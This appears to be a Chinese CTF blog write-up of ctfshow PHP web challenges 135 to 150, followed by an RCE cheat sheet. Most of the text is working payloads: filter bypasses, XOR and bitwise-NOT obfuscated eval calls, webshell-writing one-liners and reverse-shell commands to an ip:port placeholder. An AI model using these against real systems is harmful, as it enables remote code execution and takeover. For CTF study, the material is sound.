0;if(isset($_GET[&#x27;key1&#x27;]) || isset($_GET[&#x27;key2&#x27;]) || isset($_POST[&#x27;key1&#x27;]) || isset($_POST[&#x27;key2&#x27;])) &#123;    die(&quot;nonononono&quot;);&#125;@parse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);extract($_POST);if($key1 == &#x27;36d&#x27; &amp;&amp; $key2 == &#x27;36d&#x27;) &#123;    die(file_get_contents(&#x27;flag.php&#x27;));&#125;\n\npayload: ?_POST[key1]=36d&amp;_POST[key2]=36d\n\nparse_str()：把查询字符解析到变量\nectract()：从数组中将变量导入当前的符号表\nphp变量覆盖 利用点是 extract($_POST); 进行解析$_POST数组。 先将GET方法请求的解析成变量，然后在利用extract() 函数从数组中将变量导入到当前的符号表。\n\nweb135(linux命令)error_reporting(0);highlight_file(__FILE__);//flag.phpif($F = @$_GET[&#x27;F&#x27;])&#123; if(!preg_match(&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;, $F))&#123;        eval(substr($F,0,6));    &#125;else&#123;        die(&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;);    &#125;&#125;\n\npayload: ?F=`$F `;cp flag.php 1.txt  访问1.txt\n\n过滤了cat，curl等命令，所以我们用Dnslog外带获取数据很困难\n不妨将flag.php拷贝到别的文件，在访问别的文件获得flag\n\nweb136(linux命令，tee)error_reporting(0);function check($x)&#123;    if(preg_match(&#x27;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\&gt;|\\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $x))&#123;        die(&#x27;too young too simple sometimes naive!&#x27;);    &#125;&#125;if(isset($_GET[&#x27;c&#x27;]))&#123;    $c=$_GET[&#x27;c&#x27;];    check($c);    exec($c);&#125;else&#123;    highlight_file(__FILE__);&#125; \n\npayload: ?c=ls /|tee 1 ?c=cat /f149_15_h3r3|tee 2 访问2下载文件，查看\n\ntee命令：用于读取标准输入的数据，并将其内容输出成文件\ntee file1 file2：复制文件\nls /|tee 1.txt：命令输出\n\n\n\nweb137(::调用函数)error_reporting(0);highlight_file(__FILE__);class ctfshow&#123;    function __wakeup()&#123;        die(&quot;private class&quot;);    &#125;    static function getFlag()&#123;        echo file_get_contents(&quot;flag.php&quot;);    &#125;&#125;call_user_func($_POST[&#x27;ctfshow&#x27;]); \n\npayload: ctfshow=ctfshow::getFlag\n\n函数的调用\n::：调用类中的函数\n\n\n\nweb138(call_user_func传数组)error_reporting(0);highlight_file(__FILE__);class ctfshow&#123;    function __wakeup()&#123;        die(&quot;private class&quot;);    &#125;    static function getFlag()&#123;        echo file_get_contents(&quot;flag.php&quot;);    &#125;&#125;if(strripos($_POST[&#x27;ctfshow&#x27;], &quot;:&quot;)&gt;-1)&#123;    die(&quot;private function&quot;);&#125;call_user_func($_POST[&#x27;ctfshow&#x27;]); \n\npayload: ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag\n\ncall_user_func回调函数调用类里面的方法\n\ncall_user_func(array($classname, &#39;say_hello&#39;));将调用$calssname类里面的say_hello的方法\n\n\nweb139\n咦？怎么不能下载文件了？\n\nerror_reporting(0);function check($x)&#123;    if(preg_match(&#x27;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\&gt;|\\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $x))&#123;        die(&#x27;too young too simple sometimes naive!&#x27;);    &#125;&#125;if(isset($_GET[&#x27;c&#x27;]))&#123;    $c=$_GET[&#x27;c&#x27;];    check($c);    exec($c);&#125;else&#123;    highlight_file(__FILE__);&#125; \n\npayload: \nweb140(intval()弱比较)error_reporting(0);highlight_file(__FILE__);if(isset($_POST[&#x27;f1&#x27;]) &amp;&amp; isset($_POST[&#x27;f2&#x27;]))&#123;    $f1 = (String)$_POST[&#x27;f1&#x27;];    $f2 = (String)$_POST[&#x27;f2&#x27;];    if(preg_match(&#x27;/^[a-z0-9]+$/&#x27;, $f1))&#123;        if(preg_match(&#x27;/^[a-z0-9]+$/&#x27;, $f2))&#123;            $code = eval(&quot;return $f1($f2());&quot;);            if(intval($code) == &#x27;ctfshow&#x27;)&#123;                echo file_get_contents(&quot;flag.php&quot;);            &#125;        &#125;    &#125;&#125; \n\npayload: f1=md5&amp;f2=md5\n\n想要输出flag，只需让intval($code)为零即可\n例：\n\n\nmd5(phpinfo())md5(sleep())md5(md5())current(localeconv)sha1(getcwd())sha1(sha1())\n\nweb141(异或)if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;    $v1 = (String)$_GET[&#x27;v1&#x27;];    $v2 = (String)$_GET[&#x27;v2&#x27;];    $v3 = (String)$_GET[&#x27;v3&#x27;];    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;        if(preg_match(&#x27;/^\\W+$/&#x27;, $v3))&#123;            $code =  eval(&quot;return $v1$v3$v2;&quot;);            echo &quot;$v1$v3$v2 = &quot;.$code;        &#125;    &#125;&#125; \n\npayload: ?v1=1&amp;v2=2&amp;v3=-(%aa%aa%aa%aa%aa%aa^%d9%d3%d9%de%cf%c7)(%aa%aa%aa%aa%aa%aa%aa%aa%aa%aa%aa%aa^%de%cb%c9%8a%cc%c6%cb%cd%84%da%c2%da)-\n\n传的三个参数中，v1和v2必须为数字，v3中不能有数字、字母、下划线\n\n\n测试一下\n假设我们要执行的代码为phpinfo();，其中;已经提供了，v1和v2需要为数字，所以只能在v3处传参。\n经过本地测试发现：当代码为phpinfo();时，可以正常执行代码因为()不符合v3的限定条件，所以v3中可以有()\n当代码为1+phpinfo()+1;时，也可以执行代码所以v1和v2值就可以确定为任意数字，并且通过+或-连接\n当代码为2+(&#39;phpinfo&#39;)()+2;时，发现也可以正常执行此时就可以确定v3参数分为三部分组成，前面一部分是+，中间为()里面是想要执行的代码，后面的一部分为()+\n在中间的一部分中，因为不能有数字、字母或者下划线，所以可以采用异或的方法构造恶意代码使其执行。\n\n\n解题思路：\n\n\n通过上面的测试发现可以正常执行代码，所以我们只需要根据自己想要的代码进行异构即可\n\nweb142(sleep)if(isset($_GET[&#x27;v1&#x27;]))&#123;    $v1 = (String)$_GET[&#x27;v1&#x27;];    if(is_numeric($v1))&#123;        $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);        sleep($d);        echo file_get_contents(&quot;flag.php&quot;);    &#125;&#125;\n\npayload: ?v1=0\n\n仔细发现阻碍我们的只有sleep函数，所以只需让$d数值尽可能地小就行\n所以我们让传进去的v1值为0即可\n\nweb143(异或，*)if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;    $v1 = (String)$_GET[&#x27;v1&#x27;];    $v2 = (String)$_GET[&#x27;v2&#x27;];    $v3 = (String)$_GET[&#x27;v3&#x27;];    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;        if(preg_match(&#x27;/[a-z]|[0-9]|\\+|\\-|\\.|\\_|\\||\\$|\\&#123;|\\&#125;|\\~|\\%|\\&amp;|\\;/i&#x27;, $v3))&#123;                die(&#x27;get out hacker!&#x27;);        &#125;        else&#123;            $code =  eval(&quot;return $v1$v3$v2;&quot;);            echo &quot;$v1$v3$v2 = &quot;.$code;        &#125;    &#125;&#125;\n\npayload: ?v1=1&amp;v2=2&amp;v3=*(%aa%aa%aa%aa%aa%aa^%d9%d3%d9%de%cf%c7)(%aa%aa%aa%aa%aa%aa%aa%aa%aa%aa%aa%aa^%de%cb%c9%8a%cc%c6%cb%cd%84%da%c2%da)*\n\n过滤了一大堆东西，但是*并没有被过滤掉，所以只需将141的payload的-换成*即可\n\nweb144(异或)if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;    $v1 = (String)$_GET[&#x27;v1&#x27;];    $v2 = (String)$_GET[&#x27;v2&#x27;];    $v3 = (String)$_GET[&#x27;v3&#x27;];    if(is_numeric($v1) &amp;&amp; check($v3))&#123;        if(preg_match(&#x27;/^\\W+$/&#x27;, $v2))&#123;            $code =  eval(&quot;return $v1$v3$v2;&quot;);            echo &quot;$v1$v3$v2 = &quot;.$code;        &#125;    &#125;&#125;function check($str)&#123;    return strlen($str)===1?true:false;&#125;\n\npayload: ?v1=1&amp;v3=2&amp;v2=*(%aa%aa%aa%aa%aa%aa^%d9%d3%d9%de%cf%c7)(%aa%aa%aa%aa%aa%aa%aa%aa%aa%aa%aa%aa^%de%cb%c9%8a%cc%c6%cb%cd%84%da%c2%da)\n\n改一下141paylod格式即可\n\nweb145(或，取反)if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;    $v1 = (String)$_GET[&#x27;v1&#x27;];    $v2 = (String)$_GET[&#x27;v2&#x27;];    $v3 = (String)$_GET[&#x27;v3&#x27;];    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;        if(preg_match(&#x27;/[a-z]|[0-9]|\\@|\\!|\\+|\\-|\\.|\\_|\\$|\\&#125;|\\%|\\&amp;|\\;|\\&lt;|\\&gt;|\\*|\\/|\\^|\\#|\\&quot;/i&#x27;, $v3))&#123;                die(&#x27;get out hacker!&#x27;);        &#125;        else&#123;            $code =  eval(&quot;return $v1$v3$v2;&quot;);            echo &quot;$v1$v3$v2 = &quot;.$code;        &#125;    &#125;&#125;\n\npayload: ?v1=1&amp;v2=2&amp;v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%93%9E%98%D1%8F%97%8F)|\n\n*被过滤了，但是可以用|\n发现^也不能用了，不能用异或了，但是~可以用，所以方法为取反\n\nweb146(或，取反)if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;    $v1 = (String)$_GET[&#x27;v1&#x27;];    $v2 = (String)$_GET[&#x27;v2&#x27;];    $v3 = (String)$_GET[&#x27;v3&#x27;];    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;        if(preg_match(&#x27;/[a-z]|[0-9]|\\@|\\!|\\:|\\+|\\-|\\.|\\_|\\$|\\&#125;|\\%|\\&amp;|\\;|\\&lt;|\\&gt;|\\*|\\/|\\^|\\#|\\&quot;/i&#x27;, $v3))&#123;                die(&#x27;get out hacker!&#x27;);        &#125;        else&#123;            $code =  eval(&quot;return $v1$v3$v2;&quot;);            echo &quot;$v1$v3$v2 = &quot;.$code;        &#125;    &#125;&#125;\n\npaylod: ?v1=1&amp;v2=2&amp;v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%93%9E%98%D1%8F%97%8F)|\n\n跟上题一样\n\nweb147(create_function)if(isset($_POST[&#x27;ctf&#x27;]))&#123;    $ctfshow = $_POST[&#x27;ctf&#x27;];    if(!preg_match(&#x27;/^[a-z0-9_]*$/isD&#x27;,$ctfshow)) &#123;        $ctfshow(&#x27;&#x27;,$_GET[&#x27;show&#x27;]);    &#125;&#125;\n\npayload: ?show=&#125;system(&quot;tac flag.php&quot;);//    ctf=\\create_function\n\n匿名函数：create_function（在php5.3.0 或以上才能使用）\n在传参中，因为使用了匿名函数，所以需要一个&#125;来闭合前面的&#123;，在最后用注释符号将原来的&#125;注释掉\n\nweb148(异或)include &#x27;flag.php&#x27;;if(isset($_GET[&#x27;code&#x27;]))&#123;    $code=$_GET[&#x27;code&#x27;];    if(preg_match(&quot;/[A-Za-z0-9_\\%\\\\|\\~\\&#x27;\\,\\.\\:\\@\\&amp;\\*\\+\\- ]+/&quot;,$code))&#123;        die(&quot;error&quot;);    &#125;    @eval($code);&#125;else&#123;    highlight_file(__FILE__);&#125;function get_ctfshow_fl0g()&#123;    echo file_get_contents(&quot;flag.php&quot;);&#125;\n\npayload: ?code=(%aa%aa%aa%aa%aa%aa^%d9%d3%d9%de%cf%c7)(%aa%aa%aa%aa%aa%aa%aa%aa%aa%aa%aa%aa^%de%cb%c9%8a%cc%c6%cb%cd%84%da%c2%da);\n\n可以用^，所以用异或构造。\n\n\nps：感觉考的知识点并不是这个。。。\n\nweb149(file_put_contents)$files = scandir(&#x27;./&#x27;); foreach($files as $file) &#123;    if(is_file($file))&#123;        if ($file !== &quot;index.php&quot;) &#123;            unlink($file);        &#125;    &#125;&#125;file_put_contents($_GET[&#x27;ctf&#x27;], $_POST[&#x27;show&#x27;]);$files = scandir(&#x27;./&#x27;); foreach($files as $file) &#123;    if(is_file($file))&#123;        if ($file !== &quot;index.php&quot;) &#123;            unlink($file);        &#125;    &#125;&#125;\n\npayload: /index.php    1=system(&quot;cat /ctfshow_fl0g_here.txt&quot;);\n\nunlink：删除文件\n如果$file的名字不为index.php，就会被删除，而下面还有file_put_contents函数，提示已经很明显了\n解题思路：\n先利用file_put_contents函数，以GET方式传index.php为文件名，在以POST方式传一句话木马，发现上传成功\n访问index.php文件，就可以rce了\n\n\n\nweb150()class CTFSHOW&#123;    private $username;    private $password;    private $vip;    private $secret;    function __construct()&#123;        $this-&gt;vip = 0;        $this-&gt;secret = $flag;    &#125;    function __destruct()&#123;        echo $this-&gt;secret;    &#125;    public function isVIP()&#123;        return $this-&gt;vip?TRUE:FALSE;        &#125;    &#125;    function __autoload($class)&#123;        if(isset($class))&#123;            $class();    &#125;&#125;#过滤字符$key = $_SERVER[&#x27;QUERY_STRING&#x27;];if(preg_match(&#x27;/\\_| |\\[|\\]|\\?/&#x27;, $key))&#123;    die(&quot;error&quot;);&#125;$ctf = $_POST[&#x27;ctf&#x27;];extract($_GET);if(class_exists($__CTFSHOW__))&#123;    echo &quot;class is exists!&quot;;&#125;if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE)&#123;    include($ctf);&#125;\n\n","categories":["网络安全"],"tags":["wp"]},{"title":"RCE补充","url":"/post/56a911e3.html","content":"\n\nRCE总结\n无回显rcerce无回显剖析\n\n无回显rce：在命令执行的时候，虽然可以进行命令执行，但却看不到命令执行的结果，也不知道命令是否被执行\n可以使用sleep命令通过是否延时来判断该条命令是否有执行，有延时则代表命令有执行：?a=1;sleep 5\n\n一句话木马可输入长度被限制\nlinux的一些特性\n\n&gt;a：虽然没有输入但是会创建a这个文件\nls -t ls：基于事件排序（从晚到早）\nsh a：sh会把a里面的每行内容当作命令来执行使用|进行命令拼接 #l\\ s = ls\nbase64使用base64编码避免特殊字符\n\n\n可写：echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php\n\n将语句拆分写入（最后两句是重点）：\n&gt;hp  &gt;1.p\\\\  &gt;d\\&gt;\\\\  &gt;\\ -\\\\  &gt;e64\\\\  &gt;bas\\\\  &gt;7\\|\\\\  &gt;XSk\\\\  &gt;Fsx\\\\\t&gt;dFV\\\\  &gt;kX0\\\\  &gt;bCg\\\\  &gt;XZh\\\\  &gt;AgZ\\\\  &gt;waH\\\\  &gt;PD9\\\\  &gt;o\\ \\\\  &gt;ech\\\\\tls -t&gt;0\tsh 0\n\n没有限制且有写入权限\necho &quot;&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;&quot; &gt; fuck.php\n\n复制、压缩的方法\ncopy flag.php 1.txt\nmv flag.php flag.txt\ncat flag.php &gt; flag.txt\ntar cvf flag.tar flag.php\ntar zcvf flag.tar.gz flag.php\necho 3c3f706870206576616c28245f504f53545b3132335d293b203f3e|xxd -r -ps &gt; webshell.php\n\nDNSlog外带\n如果我们发起请求的目标不是IP地址而是域名的话，就一定会发生一次域名解析\n\n\n那么假如有一个可控的二级域名，那么当它向下一层域名发起解析的时候，就能拿到它的域名解析请求\n这就相当于配合dns请求完成对命令执行的判断，这就称之为dnslog，发起一个dns请求需要通过linux中的ping命令或者curl命令\n需要了解的一些命令：\nsed命令，可以实现对行的分：ls | sed -n ‘1p’ （显示第一行）\nfind\n-name：按名称查找；根据目标文件的名称进行查找，允许使用*及?通配符\n-size：按文件大小查找；一般使用+、-号设置超过或小于指定的大小作为查找条件，常用的容量单位包括kB（注意k是小写）、MB、GB；\n-user：按文件属主查找；\n-type：按文件类型查找；类型指的是普通文件（f）、目录（d）、块设备文件（b）、字符设备文件（c）等\n\n\n[Linux命令通配符](https://www.cnblogs.com/ysuwangqiang/p/11364173.html#:~:text=Linux中通配符. 　　通配符是由shell处理的%2C 它只会出现在 命令的“参数”里。. 当shell在“参数”中遇到了通配符时，shell会将其当作路径或文件名去在磁盘上搜寻可能的匹配：若符合要求的匹配存在，则进行代换(路径扩展)；否则就将该通配符作为一个普通字符传递给“命令”，然后再由命令进行处理。. 总之，通配符 实际上就是一种shell实现的路径扩展功能。. 在,SHELL中的通配符. 帮助手册：%23 man 7 glob . 匹配任意长度的任意字符，可以是0个. 匹配任意单个字符，必须是1个.)\n\n\n\n反弹shell什么是反弹sell？\n通俗来说，shell就是实现用户命令的接口，通过该接口我们能实现对计算机的控制(root权限)，而反弹shell就是将shell反弹给攻击者，从而达到让攻击者可以在自己的机器上执行shell命令，从而操控受害者的计算机。\n\n为什么要反弹shell？\n通常用于被控端因防火墙受限、权限不足、端口被占用等情形\n假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。那么什么情况下正向连接不太好用了呢？\n1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。\n2.它的ip会动态改变，你不能持续控制。\n3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。\n4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。\n那么反弹就很好理解了， 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。\n\nlinux文件描述符\n可以理解为linux跟踪打开文件，而分配的一个数字，这个数字有点类似c语言操作文件时候的句柄，通过句柄就可以实现文件的读写操作。\n\n当Linux启动的时候会默认打开三个文件描述符(0,1,2)\n\n\n\n标准输入standard input 0 （默认设备键盘）标准输出standard output 1（默认设备显示器）错误输出：error output 2（默认设备显示器）\n\n\n注意：\n以后再打开文件，描述符可以依次增加\n一条shell命令，都会继承其父进程的文件描述符，因此所有的shell命令，都会默认有三个文件描述符。\n文件所有输入输出都是由该进程所有打开的文件描述符控制的。\n\n\n\n重定向\n输入输出操作都是依赖文件描述符实现的，重定向输入输出本质上就是重定向文件描述符\n\n重定向主要分为两种(其他复杂的都是从这两种衍生而来的)：\n\n输入重定向 &lt; &lt;&lt;\n输出重定向 &gt; &gt;&gt;\n\n\n重点：\n\nbash 在执行一条指令的时候，首先会检查命令中存不存在重定向的符号，如果存在那么首先将文件描述符重定向，然后在把重定向去掉，执行指令\n如果指令中存在多个重定向，那么不要随便改变顺序，因为重定向是从左向右解析的，改变顺序可能会带来完全不同的结果\n&lt; 是对标准输入 0 重定向 ，&gt; 是对标准输出 1 重定向\n重定向就是针对文件描述符的操作\n\n\n\n输入重定向格式：[n]&lt; word （注意[n]与&lt;之间没有空格）\n说明：将文件描述符 n 重定向到 word 指代的文件（以只读方式打开）,如果n省略就是0（标准输入）\n输出重定向格式：[n]&gt; word\n说明： 将文件描述符 n 重定向到word 指代的文件（以写的方式打开），如果n 省略则默认就是 1（标准输出）\n标准输出与标准错误输出重定向格式：&amp;&gt; word &gt;&amp; word\n说明：将标准输出与标准错误输出都定向到word代表的文件（以写的方式打开），两种格式意义完全相同，这种格式完全等价于&gt; word 2&gt;&amp;1（2&gt;&amp;1是将标准错误输出复制到标准输出，&amp;是为了区分文件1和文件描述符1的）\n文件描述符的复制格式：[n]&lt;&amp;[m] / [n]&gt;&amp;[m](这里所有字符之间不要有空格)\n说明：\n\n这里两个都是将文件描述符 n 复制到 m ，两者的区别是，前者是以只读的形式打开，后者是以写的形式打开\n因此 0&lt;&amp;1 和 0&gt;&amp;1 是完全等价的（读/写方式打开对其没有任何影响）\n这里的&amp; 目的是为了区分数字名字的文件和文件描述符，如果没有&amp; 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符\n\nexec 绑定重定向格式：exec [n] &lt;/&gt; file/[n]\n说明：上面的输入输出重定向将输入和输出绑定文件或者设备以后只对当前的那条指令有效，如果需要接下来的指令都支持的话就需要使用 exec 指令\n\n重点：\n格式：[n]&lt;&gt;word\n说明：以读写方式打开word指代的文件，并将n重定向到该文件。如果n不指定的话，默认为标准输入。\n\n\n\n常见的反弹shellbash反弹\nbash -i &gt; /dev/tcp/ip/port\n\n\n将受害端的标准输出重定向到攻击端，但是还没实现用命令控制受害端。\n\n\nbash -i &lt; /dev/tcp/ip/port\n\n\n将攻击端的输入重定向到受害端，但是攻击端看不到命令执行结果。\n\n\nbash -i &gt; /dev/tcp/ip/port 0&gt;&amp;1\n\n\n基本实现了反弹shell的功能。但是受害端的机器上依然回显了攻击者机器上执行的命令，且攻击端看不到错误命令的输出。\n\n\nbash -i &gt; /dev/tcp/ip/port 0&gt;&amp;1 2&gt;&amp;1\n\n\n攻击端已获得受害端的远程交互式shell，而且受害端没有再回显攻击端输入的命令。\n\nnc命令\nnc -e /bin/bash ip port：nc反弹\n\n\nnc -lvp port：监听端口\n\n&gt;&amp;、&amp;&gt;\n解决受害机能看到攻击机执行命令的情况\n\n\nbash -i &gt; /dev/tcp/ip/port 0&gt;&amp;1 2&gt;&amp;1\nbash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\n\n无参数RCE\n无参数rce：通过没有参数的函数达到命令执行的目的。\n\n&lt;?php\tif(&#x27;;&#x27;===preg_replace(&#x27;/[a-z,_]+\\((?R)?\\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])&#123; \t\t     eval($_GET[&#x27;exp&#x27;]);\t&#125;?&gt;\n\n\n如果&#39;;&#39;===preg_replace(...)，那么就执行exp传递的命令\n\\ : 转义字符不多说了\n[a-z,_]+ : [a-z,_]匹配小写字母和下划线 +表示1到多个\n(?R)? : (?R)代表当前表达式，就是这个(/[a-z,_]+((?R)?)/)，所以会一直递归，?表示递归当前表达式0次或1次（若是(?R)*则表示递归当前表达式0次或多次，例如它可以匹配a(b(c()d()))）\n\n\n简单说来就是：这串代码检查了我们通过GET方式传入的exp参数的值，如果传进去的值是传进去的值是字符串接一个()，那么字符串就会被替换为空。如果（递归）替换后的字符串只剩下;,那么我们传进去的 exp 就会被 eval 执行。比如我们传入一个 phpinfo();，它被替换后就只剩下;，那么根据判断条件就会执行phpinfo();。\n(?R)?能匹配的只有a(); a(b()); a(b(c()));这种类型的。比如传入a(b(c()));，第一次匹配后，就剩a(b());，第二次匹配后，a();，第三次匹配后就只剩下;了，最后a(b(c()));就会被eval执行。\n\n常见绕过姿势getallheaders()\n获取全部HTTP请求头信息\n\n\ngetallheaders()返回所有的HTTP头信息，但是要注意的一点是这个函数返回的是一个数组，而eval()要求的参数是一个字符串，所以这里不能直接用，这时我们就要想办法将数组转换为字符串。正好implode()这个函数就能胜任。\n\n\nimplode()：将一个一维数组的值转化为字符串\n\n&lt;?php\techo implode(getallheaders());?&gt;\n\n\n利用上述代码即可将HTTP请求头的信息输出，此时随意构造一个请求头，内容为恶意代码并将后面内容注释掉，即可获得信息。\n\nget_defined_vars()\n返回由所有已定义变量所组成的数组\n\n\nvar_dump(get_defined_vars());可以将所有已定义的变量以二维数组的形式输出。\n\n\ncurrent()：返回数组中的当前值\n\nsession_id()\n获取/设置当前会话ID，这个函数来获取cookie中的phpsessionid了，并且这个值我们是可控的。\n\n限制：文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - （减号）\n\n解决办法：将参数转化为16进制传进去，之后再用hex2bin()函数转换回来。\n\nhex2bin()：转换十六进制字符串为二进制字符串\n\n\n使用前提条件：需要开启session_start()所以即可构造eval(hex2bin(session_id(session_start())))\n\n使用此payload时，需要构造cookie请求头，Cookie: PHPSESSID=执行代码的16进制\n\n\n配合使用的函数\ngetcwd() 函数返回当前工作目录。\n\nscandir() 函数返回指定目录中的文件和目录的数组。\n\ndirname() 函数返回路径中的目录部分。\n\nchdir() 函数改变当前的目录。\n\nreadfile() 输出一个文件。\n\ncurrent() 返回数组中的当前单元, 默认取第一个值。\n\npos() current() 的别名。\n\nnext() 函数将内部指针指向数组中的下一个元素，并输出。\n\nend() 将内部指针指向数组中的最后一个元素，并输出。\n\narray_rand() 函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。\n\narray_flip() array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。\n\narray_slice() 函数在数组中根据条件取出一段值，并返回。\n\narray_reverse() 函数返回翻转顺序的数组。\n\nchr() 函数从指定的 ASCII 值返回字符。\n\nhex2bin() — 转换十六进制字符串为二进制字符串。\n\ngetenv() 获取一个环境变量的值(在7.1之后可以不给予参数)。\n\nlocaleconv() 函数返回一包含本地数字及货币格式信息的数组。\n\nhighlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码，相当于就是用来读取文件的\n\n\n无数字、字母rce无字母数字rce总结 \n取反&lt;?php $a=urlencode(~&#x27;assert&#x27;);echo $a;echo &quot;\\n&quot;;$b=urlencode(~&#x27;eval($_POST[1]);&#x27;);echo $b;\n\nshell：(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4);\n异或\n异或脚本\n\n&lt;?php    $a = &quot;phpinfo&quot;;    for ($i = 0; $i &lt; strlen($a); $i++) &#123;        echo &quot;%&quot;.dechex(ord($a[$i])^0xff);    &#125;    echo &quot;^&quot;;    for ($i = 0; $i &lt; strlen($a); $i++) &#123;        echo &quot;%ff&quot;;    &#125;\n\nvar_dump(&#x27;#&#x27;^&#x27;|&#x27;); //得到字符 _var_dump(&#x27;.&#x27;^&#x27;~&#x27;); //得到字符 P    var_dump(&#x27;/&#x27;^&#x27;`&#x27;); //得到字符 0    var_dump(&#x27;|&#x27;^&#x27;/&#x27;); //得到字符 S    var_dump(&#x27;&#123;&#x27;^&#x27;/&#x27;); //得到字符 T    $__=(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;&#123;&quot;^&quot;/&quot;);  //变量$__值为字符串&#x27;_POST&#x27;\n\n&lt;?php$_ = &quot;!((%)(&quot;^&quot;@[[@[\\\\&quot;;   //构造出assert$__ = &quot;!+/((&quot;^&quot;~&#123;`&#123;|&quot;;   //构造出_POST$___ = $$__;   //$___ = $_POST$_($___[_]);   //assert($_POST[_]);\n\n\n$&#123;&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;&#125;[&#39;+&#39;]();&amp;+=命令   //$_GET[+]$&#123;%A0%B8%BA%AB^%ff%ff%ff%ff&#125;&#123;%A0&#125;();&amp;%A0=命令或函数\\\n\n\n需要注意的是，由于我们的Payload中含有一些特殊字符，我们我们需要对Payload进行一次URL编码。\n\n或import re content = &#x27;&#x27;preg = &#x27;[a-z]|[0-9]&#x27; # 题目过滤正则# 生成字典for i in range(256):    for j in range(256):        if not (re.match(preg, chr(i), re.I) or re.match(preg, chr(j), re.I)):            k = i | j            if 32 &lt;= k &lt;= 126:                a = &#x27;%&#x27; + hex(i)[2:].zfill(2)                b = &#x27;%&#x27; + hex(j)[2:].zfill(2)                content += (chr(k) + &#x27; &#x27; + a + &#x27; &#x27; + b + &#x27;\\n&#x27;)f = open(&#x27;rce_or.txt&#x27;, &#x27;w&#x27;)f.write(content) while True:    payload1 = &#x27;&#x27;    payload2 = &#x27;&#x27;    code = input(&quot;data:&quot;)    for i in code:        f = open(&#x27;rce_or.txt&#x27;)        lines = f.readlines()        for line in lines:            if i == line[0]:                payload1 = payload1 + line[2:5]                payload2 = payload2 + line[6:9]                break    payload = &#x27;(&quot;&#x27;+payload1+&#x27;&quot;|&quot;&#x27;+payload2+&#x27;&quot;)&#x27;    print(&quot;payload: &quot;+ payload)\n\n自增&lt;?php     $_++;\n\n\n$++对变量进行了自增操作,由于我们没有定义的值,PHP会给赋一个默认值NULL==0,由此我们可以看出,我们可以在不使用任何数字的情况下,通过对未定义变量的自增操作来得到一个数字 \n\n&quot;A&quot;++ ==&gt; &quot;B&quot;&quot;B&quot;++ ==&gt; &quot;C&quot;\n\n\n如果我们能够得到”A”，那么我们就能通过自增自减，得到所有的字母。 那么问题就转化为怎么得到一个字符”A”。在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为”Array”。再取这个字符串的第一个字母，就可以获得”A”。\n\n&lt;?php$a = &#x27;&#x27;.[];var_dump($a);\n\n\n$++对变量进行了自增操作,由于我们没有定义*的值,PHP会给*赋一个默认值NULL==0,由此我们可以看出,我们可以在不使用任何数字的情况下,通过对未定义变量的自增操作来得到一个数字\n\n&lt;?php$_=[].&#x27;&#x27;;   //得到&quot;Array&quot;$___ = $_[$__];   //得到&quot;A&quot;，$__没有定义，默认为False也即0，此时$___=&quot;A&quot;$__ = $___;   //$__=&quot;A&quot;$_ = $___;   